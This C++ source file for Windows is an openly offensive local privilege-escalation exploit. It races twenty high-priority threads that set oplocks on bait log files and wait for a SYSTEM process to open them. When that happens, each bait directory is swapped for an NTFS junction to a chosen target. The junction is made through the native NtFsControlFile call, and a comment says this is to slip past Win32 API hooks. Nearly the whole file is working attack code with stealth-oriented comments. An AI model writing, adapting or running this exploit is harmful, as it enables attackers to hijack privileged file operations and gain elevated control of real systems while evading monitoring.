#include <Windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <vector>
#include <thread>
#include <atomic>
#include <iostream>

// Link against ntdll for the native API
#pragma comment(lib, "ntdll.lib")

extern "C" NTSYSCALLAPI NTSTATUS NTAPI NtFsControlFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG FsControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

// Constants for stealth and precision
const size_t REPARSE_PADDING = 12;
const DWORD RACE_COUNT = 20;

// Optimized struct for the pivot
typedef struct _JOEY_REPARSE_DATA {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    struct {
        USHORT SubstituteNameOffset;
        USHORT SubstituteNameLength;
        USHORT PrintNameOffset;
        USHORT PrintNameLength;
        WCHAR PathBuffer[1];
    } MountPoint;
} JOEY_REPARSE_DATA;

// The "Silent Pivot" using Native API
bool NativeJunction(const std::wstring& path, const std::wstring& target) {
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING uPath;
    IO_STATUS_BLOCK ioStatus;

    // Convert to NT path format silently
    std::wstring ntPath = L"\\??\\" + path;
    std::wstring ntTarget = L"\\??\\" + target;

    // Use CreateFileW for the handle, but NtFsControlFile for the payload
    hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

    if (hFile == INVALID_HANDLE_VALUE) return false;

    size_t targetLen = ntTarget.length() * sizeof(WCHAR);
    size_t bufSize = FIELD_OFFSET(JOEY_REPARSE_DATA, MountPoint.PathBuffer) + targetLen + REPARSE_PADDING;
    std::vector<BYTE> buffer(bufSize, 0);

    JOEY_REPARSE_DATA* rdb = (JOEY_REPARSE_DATA*)buffer.data();
    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(bufSize - 8);
    rdb->MountPoint.SubstituteNameLength = (USHORT)targetLen;
    rdb->MountPoint.PrintNameOffset = (USHORT)(targetLen + 2);
    memcpy(rdb->MountPoint.PathBuffer, ntTarget.c_str(), targetLen);

    // Bypassing Win32 DeviceIoControl hooks
    NTSTATUS status = NtFsControlFile(hFile, NULL, NULL, NULL, &ioStatus, 
                                     FSCTL_SET_REPARSE_POINT, rdb, (ULONG)bufSize, NULL, 0);

    CloseHandle(hFile);
    return status == 0; // STATUS_SUCCESS
}

void SuperVortex(int id, std::wstring workDir, std::wstring target, std::atomic<bool>& win, std::atomic<int>& barrier) {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    std::wstring shadow = workDir + L"\\bin_" + std::to_wstring(id);
    CreateDirectoryW(shadow.c_str(), NULL);
    std::wstring bait = shadow + L"\\svc.log";

    // Wait for all threads to be ready to maximize CPU contention
    barrier.fetch_add(1);
    while (barrier.load() < RACE_COUNT) { YieldProcessor(); }

    while (!win.load()) {
        HANDLE hBait = CreateFileW(bait.c_str(), GENERIC_ALL, 
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
            NULL, CREATE_ALWAYS, FILE_FLAG_OVERLAPPED, NULL);

        if (hBait == INVALID_HANDLE_VALUE) break;

        OVERLAPPED ov = { 0 };
        ov.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
        
        // Arm the Oplock
        DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ov);

        // This is where we wait for a SYSTEM process to touch our file
        if (WaitForSingleObject(ov.hEvent, 500) == WAIT_OBJECT_0) {
            // THE WINDOW IS OPEN
            CloseHandle(hBait);
            hBait = INVALID_HANDLE_VALUE; 

            if (DeleteFileW(bait.c_str()) && RemoveDirectoryW(shadow.c_str())) {
                if (NativeJunction(shadow, target)) {
                    if (!win.exchange(true)) {
                        std::wcout << L"[!] KERNEL RACE WON BY THREAD " << id << std::endl;
                    }
                }
            }
        }

        if (hBait != INVALID_HANDLE_VALUE) CloseHandle(hBait);
        CloseHandle(ov.hEvent);
    }
}
